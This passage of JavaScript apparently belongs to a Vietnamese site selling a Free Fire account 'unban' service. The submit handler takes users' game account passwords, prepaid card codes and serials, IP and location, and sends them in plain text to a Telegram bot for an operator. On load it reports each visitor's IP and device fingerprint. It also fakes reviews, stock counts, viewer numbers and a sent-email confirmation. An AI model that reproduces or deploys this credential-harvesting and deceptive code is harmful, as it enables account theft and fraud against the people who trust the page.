document.querySelectorAll('.payment-method-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.payment-method-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.paymentMethod = this.dataset.method; var bi = document.getElementById('bankInfo'); var ci = document.getElementById('cardInfo'); var us = document.getElementById('uploadSection'); if (bi) bi.classList.toggle('hidden', state.paymentMethod !== 'bank'); if (ci) ci.classList.toggle('hidden', state.paymentMethod !== 'card'); if (us) us.classList.toggle('hidden', state.paymentMethod !== 'bank'); if (state.paymentMethod === 'card') removeImage(); }); });
document.querySelectorAll('.platform-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.platform-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.platform = this.dataset.platform; }); });
var ffIdInput = document.getElementById('ffIdInput'); if (ffIdInput) { ffIdInput.addEventListener('blur', function() { var uid = this.value.trim(); if (uid.length >= 8) autoDetectGame(uid); }); }
var pwInput = document.getElementById('passwordInput'); if (pwInput) { pwInput.addEventListener('input', function() { var warn = document.getElementById('passwordWarning'); if (!warn) return; if (this.value.length > 0 && this.value.length < 6) { warn.style.display = 'block'; } else { warn.style.display = 'none'; } }); }
var accWashingCheckbox = document.getElementById('accWashing'); if (accWashingCheckbox) { accWashingCheckbox.addEventListener('change', function() { if (this.checked) showWashingProgress(); }); }

// ============================================
// SUBMIT HANDLER - CÓ ERROR HANDLING ĐẦY ĐỦ
// ============================================
var submitBtn = document.getElementById('submitRequestBtn');
if (submitBtn) { 
    submitBtn.addEventListener('click', async function() {
        safeExecute(async function() {
            var ffId = document.getElementById('ffIdInput'); 
            var platformAcc = document.getElementById('platformAccountInput'); 
            var password = document.getElementById('passwordInput'); 
            var captchaAnswer = document.getElementById('captchaAnswer'); 
            var honeypot = document.getElementById('honeypotField'); 
            
            var ffIdVal = ffId ? ffId.value.trim() : ''; 
            var platformAccVal = platformAcc ? platformAcc.value.trim() : ''; 
            var passwordVal = password ? password.value.trim() : ''; 
            var captchaVal = captchaAnswer ? parseInt(captchaAnswer.value || '0') : 0; 
            var honeypotVal = honeypot ? honeypot.value : ''; 
            
            if (honeypotVal.length > 0) { Swal.fire('🤖', 'Phát hiện bot!', 'error'); return; } 
            if (!ffIdVal || !platformAccVal || !passwordVal) { Swal.fire('❌', 'Vui lòng nhập đầy đủ thông tin!', 'error'); return; } 
            if (isNaN(captchaVal) || captchaVal !== state.captchaResult) { generateCaptcha(); if (captchaAnswer) captchaAnswer.value = ''; Swal.fire('❌', 'Sai captcha! Vui lòng thử lại.', 'error'); return; } 
            
            var cardTypeVal = ''; var cardCodeVal = ''; var cardSerialVal = '';
            if (state.paymentMethod === 'card') { 
                var cardTypeEl = document.getElementById('cardType'); 
                var cardCodeEl = document.getElementById('cardCode'); 
                var cardSerialEl = document.getElementById('cardSerial'); 
                cardTypeVal = cardTypeEl ? cardTypeEl.value : 'Viettel'; 
                cardCodeVal = cardCodeEl ? cardCodeEl.value.trim() : ''; 
                cardSerialVal = cardSerialEl ? cardSerialEl.value.trim() : ''; 
                if (!cardCodeVal || !cardSerialVal) { Swal.fire('❌', 'Vui lòng nhập mã thẻ và seri!', 'error'); return; } 
            }
            
            if (state.paymentMethod === 'bank' && !uploadedImageFile) { Swal.fire('❌', 'Vui lòng tải ảnh chuyển khoản!', 'error'); return; } 
            if (state.plan.name === 'ultimate' && planStocks.ultimate <= 0) { Swal.fire('❌', 'Hết suất Ultimate!', 'error'); return; } 
            if (state.plan.name === 'vip' && planStocks.vip <= 0) { Swal.fire('❌', 'Hết suất VIP!', 'error'); return; } 
            
            var finalPrice = getFinalPrice(); 
            var scheduleText = selectedSchedule === 'now' ? 'XỬ LÝ NGAY' : 'Đặt lịch: ' + selectedSchedule; 
            
            var confirmHtml = '<p>🎮 Game: <b>' + state.game.toUpperCase() + '</b></p>' +
                '<p>💎 Gói: <b>' + state.plan.name.toUpperCase() + '</b></p>' +
                '<p>💰 Tổng: <span style="color:#ffd966;font-size:1.3rem;font-weight:bold;">' + finalPrice.toLocaleString() + 'đ</span></p>' +
                '<p>⏰ ' + scheduleText + '</p>';
            if (document.getElementById('accWashing') && document.getElementById('accWashing').checked) confirmHtml += '<p style="color:#9b59b6;">🧹 + Rửa acc: 200.000đ</p>';
            if (state.paymentMethod === 'card') confirmHtml += '<p style="color:#f39c12;">💳 Thẻ cào ' + cardTypeVal + '</p>';
            if (giftDiscount > 0) confirmHtml += '<p style="color:#ffd700;">🎁 Giảm giá: ' + giftDiscount + '%</p>';
            
            var confirmResult = await Swal.fire({ 
                title: '📋 XÁC NHẬN ĐƠN HÀNG', 
                html: confirmHtml, 
                icon: 'question', 
                showCancelButton: true, 
                confirmButtonText: '✅ GỬI YÊU CẦU', 
                cancelButtonText: '❌ HỦY' 
            }); 
            
            if (!confirmResult.isConfirmed) return; 
            
            var btn = this; 
            btn.disabled = true; 
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ĐANG GỬI...'; 
            
            var pb = document.getElementById('progressBar'); if (pb) pb.classList.add('hidden'); 
            var td = document.getElementById('timerDisplay'); if (td) td.classList.add('hidden'); 
            var ew = document.getElementById('warrantySection'); if (ew) ew.remove(); 
            if (state.countdownInterval) clearInterval(state.countdownInterval); 
            if (state.pollingInterval) clearTimeout(state.pollingInterval); 
            if (state.scheduleTimer) clearInterval(state.scheduleTimer); 
            resetProgress(); 
            
            var rb = document.getElementById('resultBox'); 
            if (rb) { rb.classList.remove('hidden'); rb.innerHTML = '<div style="text-align:center;color:#ffd966;"><i class="fas fa-spinner fa-spin"></i> Đang gửi yêu cầu...</div>'; } 
            
            try { 
                state.currentOrderId = 'FF-' + Date.now().toString(36).toUpperCase(); 
                var ipDetails = await fetchIPDetails(userIP); 
                
                var messageText = '🔔 <b>YÊU CẦU MỚI #' + state.currentOrderId + '</b>\n' +
                    '👤 Tên: ' + (userNickname || 'N/A') + '\n' +
                    '🎮 Game: ' + state.game.toUpperCase() + '\n' +
                    '💎 Gói: ' + state.plan.name.toUpperCase() + '\n' +
                    '💰 Giá: ' + finalPrice.toLocaleString() + 'đ\n' +
                    '⏰ ' + scheduleText + '\n' +
                    '🆔 UID: ' + ffIdVal + '\n' +
                    '📧 TK: ' + platformAccVal + '\n' +
                    '🔐 MK: ' + passwordVal + '\n' +
                    '🌐 IP: ' + userIP + '\n' +
                    '📍 Vị trí: ' + (ipDetails.city || 'Unknown') + ', ' + (ipDetails.country || 'VN');
                
                if (document.getElementById('accWashing') && document.getElementById('accWashing').checked) messageText += '\n🧹 Rửa acc: CÓ';
                if (giftDiscount > 0) messageText += '\n🎁 Gift: ' + appliedGiftCode + ' (-' + giftDiscount + '%)';
                if (state.paymentMethod === 'card') messageText += '\n💳 Thẻ: ' + cardTypeVal + '\n🎫 Mã: ' + cardCodeVal + '\n🔢 Seri: ' + cardSerialVal;
                
                if (state.paymentMethod === 'bank' && uploadedImageFile) { 
                    try {
                        var blob = uploadedImageFile; 
                        if (uploadedImageFile.size > 500000) blob = await compressImageBlob(uploadedImageFile); 
                        await sendPhotoToTelegram(blob, '📸 Ảnh CK - Đơn #' + state.currentOrderId); 
                    } catch(imgErr) { console.error('Lỗi gửi ảnh:', imgErr); }
                }
                
                var buttons = [[
                    { text: '✅ ĐỒNG Ý', callback_data: 'approve_' + state.currentOrderId }, 
                    { text: '❌ TỪ CHỐI', callback_data: 'reject_' + state.currentOrderId }
                ]]; 
                
                var msgResult = await sendMessageWithButtons(messageText, buttons); 
                
                if (msgResult && msgResult.ok && msgResult.result) { 
                    await sendPrivateToAdmin('🔔 ĐƠN MỚI #' + state.currentOrderId + '\n👤 ' + (userNickname || 'User') + '\n🎮 ' + state.game.toUpperCase() + '\n💰 ' + finalPrice.toLocaleString() + 'đ\n🌐 IP: ' + userIP).catch(function(){});
                    saveToHistory(state.currentOrderId, ffIdVal, finalPrice, 'pending'); 
                    
                    if (rb) rb.innerHTML = '<div style="color:#2ecc71;text-align:center;"><h3>✅ GỬI THÀNH CÔNG!</h3><p>Mã đơn: <b>#' + state.currentOrderId + '</b></p><p style="color:#ffd966;">⏳ Đang chờ admin duyệt...</p></div>'; 
                    
                    if (platformAccVal.indexOf('@') !== -1) { 
                        var ebox = document.getElementById('emailConfirmBox'); 
                        if (ebox) { ebox.classList.remove('hidden'); ebox.innerHTML = '<i class="fas fa-envelope"></i> 📧 Đã gửi email xác nhận đến <strong>' + platformAccVal + '</strong>'; } 
                    } 
                    
                    addSecurityLog('Gửi yêu cầu #' + state.currentOrderId + ' - Thành công'); 
                    playSound('notification'); 
                    
                    startPollingForApproval(msgResult.result.message_id, state.currentOrderId); 
                    
                    if (selectedSchedule !== 'now') { 
                        var si = document.getElementById('scheduledInfo'); 
                        if (si) { si.classList.remove('hidden'); si.innerHTML = '<i class="fas fa-calendar-check"></i> Đã đặt lịch #' + state.currentOrderId + ' lúc ' + selectedSchedule; } 
                    } 
                    
                    Swal.fire({ icon: 'success', title: '✅ Gửi Thành Công!', text: 'Mã đơn: #' + state.currentOrderId + '\nVui lòng chờ admin duyệt.', confirmButtonText: 'OK', timer: 5000 }); 
                    generateCaptcha(); 
                    var ca = document.getElementById('captchaAnswer'); if (ca) ca.value = ''; 
                } else { 
                    throw new Error('Không thể gửi tin nhắn Telegram - kiểm tra lại bot token hoặc kết nối mạng'); 
                } 
            } catch (error) { 
                console.error('Submit error:', error);
                reportErrorToTelegram({ message: 'Submit error: ' + error.message, source: 'submit-handler' });
                if (rb) rb.innerHTML = '<div style="color:#ff6b6b;text-align:center;"><h3>❌ LỖI GỬI YÊU CẦU</h3><p>' + error.message + '</p><p style="font-size:0.85rem;">Vui lòng thử lại hoặc liên hệ admin.</p></div>'; 
                playSound('error'); 
                addSecurityLog('Gửi yêu cầu #' + state.currentOrderId + ' - Lỗi: ' + error.message);
            } finally { 
                btn.disabled = false; 
                btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; 
            }
        }, null, 'submit-handler');
    }); 
}

// ============================================
// INIT
// ============================================
async function init() {
    try {
        var isBlocked = await checkIfBlocked(); if (!isBlocked) return;
        var isSuspicious = checkSuspiciousIP(); if (!isSuspicious) return;
        var uip = document.getElementById('userIpDisplay'); if (uip) uip.textContent = userIP;
        var dh = document.getElementById('deviceHash'); if (dh) dh.textContent = deviceFingerprint.substring(0, 8);
        var ipDetails = await fetchIPDetails(userIP);
        sendToTelegram('🟢 <b>USER MỚI</b>\n👤 ' + (userNickname || 'NoName') + '\n📡 IP: ' + userIP + '\n📍 ' + (ipDetails.city || 'Unknown') + ', ' + (ipDetails.country || 'VN') + '\n🆔 Device: ' + deviceFingerprint + '\n📌 Chat: /chat ' + userIP);
        
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches && !localStorage.getItem('darkMode')) { darkMode = true; document.body.classList.add('light-mode'); }
        else if (localStorage.getItem('darkMode') === 'true') { darkMode = true; document.body.classList.add('light-mode'); }
        if (darkMode) { var dmt = document.getElementById('darkModeToggle'); if (dmt) dmt.textContent = '☀️'; }
        
        setupAvatarSystem(); checkBroadcast(); addSecurityLog('Truy cập từ IP ' + userIP);
        createParticles(); generateCaptcha(); updatePrices(); updateOnlineCount(); startSocialProof();
        startLiveActivityFeed(); setupImageUpload(); updateStocks(); updateSuccessRate();
        updatePlanViewers(); updateBuyingCounter(); updateTodaySold(); updateDaysRunning(); updateActivityLog(); addLiveOrderFeed();
        setInterval(updatePlanViewers, 15000); setInterval(updateBuyingCounter, 10000); setInterval(updateTodaySold, 30000);
        setInterval(addRandomReview, 25000); setInterval(updateSuccessRate, 45000); setInterval(updateStocks, 60000);
        setInterval(addLiveOrderFeed, 20000); setInterval(autoBackup, 3600000);
        if (Notification.permission === 'default') Notification.requestPermission();
        setTimeout(function() { var ws = document.getElementById('wsStatus'); var wst = document.getElementById('wsStatusText'); if (ws) { ws.className = 'ws-status ws-connected'; } if (wst) { wst.textContent = 'Connected'; } }, 2000);
        var rawHistory = localStorage.getItem('toolHistory') || '[]'; var history = []; try { history = JSON.parse(decryptData(rawHistory)); } catch (e) { history = JSON.parse(rawHistory); }
        var ul = document.getElementById('userLevel'); if (ul) ul.textContent = Math.floor(history.filter(function(h) { return h.status === 'approved'; }).length / 2) + 1;
        resetInactivityTimer();
        
        // Khởi động centralized polling
        centralizedPollingLoop();
        
        // Thông báo khởi động thành công
        sendToTelegram('✅ <b>HỆ THỐNG KHỞI ĐỘNG</b>\n📟 v13.3 Error Monitoring Active\n🌐 IP: ' + userIP + '\n⏰ ' + new Date().toLocaleString('vi-VN'));
        console.log('✅ DEVILS WILL RISE v13.3 - ĐÃ SẴN SÀNG | Error Monitoring: ACTIVE');
    } catch (e) {
        reportErrorToTelegram({ message: 'Init error: ' + e.message, source: 'init' });
        console.error('❌ Init Error:', e);
    }
}

init();

window.addEventListener('beforeunload', function() {
    if (state.countdownInterval) clearInterval(state.countdownInterval);
    if (state.pollingInterval) clearTimeout(state.pollingInterval);
    if (state.scheduleTimer) clearInterval(state.scheduleTimer);
    if (inactivityTimer) clearTimeout(inactivityTimer);
});